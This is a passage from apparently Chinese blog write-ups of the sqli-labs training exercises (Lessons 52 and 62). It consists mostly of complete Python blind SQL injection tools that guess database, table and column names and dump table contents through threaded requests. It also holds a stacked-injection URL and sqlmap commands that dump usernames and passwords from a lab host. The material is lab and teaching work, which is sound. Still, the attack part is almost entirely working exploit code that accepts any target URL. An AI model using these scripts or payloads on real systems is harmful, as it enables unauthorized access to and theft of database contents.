IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    print(lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\">    basehtml = requests.get(</span><br><span class=\"line\">        <span class=\"string\">'http://10.60.17.35:8082/Less-52/?sort=rand(true)'</span>, headers=headers).content</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).content</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (basehtml == html):</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d)\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url, basehtml)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url, basehtml)</span><br><span class=\"line\">    lenth = get_all_db_len(url, basehtml, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, basehtml, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, basehtml, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, basehtml, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, basehtml, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, basehtml, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, basehtml, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, basehtml, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select column_name from information_schema.columns where table_name='%s' AND table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, basehtml, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d)\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, basehtml, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, basehtml, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, basehtml, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, basehtml, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    basehtml = getbasehtml(</span><br><span class=\"line\">        <span class=\"string\">'http://10.60.17.35:8082/Less-52/?sort=rand(true)'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url, basehtml)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, basehtml, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, basehtml, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p><code>http://10.60.17.35:8082/Less-52/?sort=rand(false);create+table+less52+like+users</code></p>\n<p><img src=\"/img/sql/Lesson-52/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-52/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20</code></p>\n<p><img src=\"/img/sql/Lesson-52/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-52/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20 -D security -T users -C username,password --dump</code></p>\n<p><img src=\"/img/sql/Lesson-52/012.png\" alt=\"012\"></p>\n"},{"title":"sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求","date":"2018-11-29T06:05:15.000Z","_content":"\n# sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求\n\n---\n\n\n\n## 注入\n\n`http://10.60.17.35:8082/Less-62/?id=1')+and+1=1%23`\n\n`http://10.60.17.35:8082/Less-62/?id=1')+and+1=2%23`\n\n构造闭合方式为表现不同,表现为布尔型注入。\n\n可以使用脚本代替手工测试。\n\n获取当前数据库名\n\n![001](/img/sql/Lesson-62/001.png)\n\n获取表名\n\n![002](/img/sql/Lesson-62/002.png)\n\n获取列名\n\n![003](/img/sql/Lesson-62/003.png)\n\n获取秘钥\n\n![004](/img/sql/Lesson-62/004.png)\n\n成功。\n\n![005](/img/sql/Lesson-62/005.png)\n\n但是使用无论是脚本还是手注都会遇到一个问题,单个字符的猜解平均达到到8次请求,对脚本里用的取与法来说是正常的,但是在只能130次的情况下超出太多了,完整的一次流程达到630左右....\n\n## 测试脚本\n\n```\n#python3\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nfeature = 'Your Login name'\nhead = \"')\"\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef binary_search_db(url, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).text\n            if feature in html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n# 获取当前数据库长度\n\n\ndef get_db_len(url):\n    payload = head + \\\n        \" AND ORD(MID((SELECT LENGTH(database())),%d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前数据库长度: %d' % lenth)\n    return lenth\n\n# 获取当前数据库名\n\n\ndef get_cu_db_name(url):\n    lenth = get_db_len(url)\n    dbname = \"\"\n    for i in range(lenth):\n        payload = head + \\\n            \" and ascii(substr((select database()),%d,1))\" % (i + 1)\n        dbname += and_method(url, payload)\n        print('[-]当前猜解', dbname)\n    print('[*]', dbname)\n\n\ndef getdbnum(url):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).text\n        if feature in html:\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d--+\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    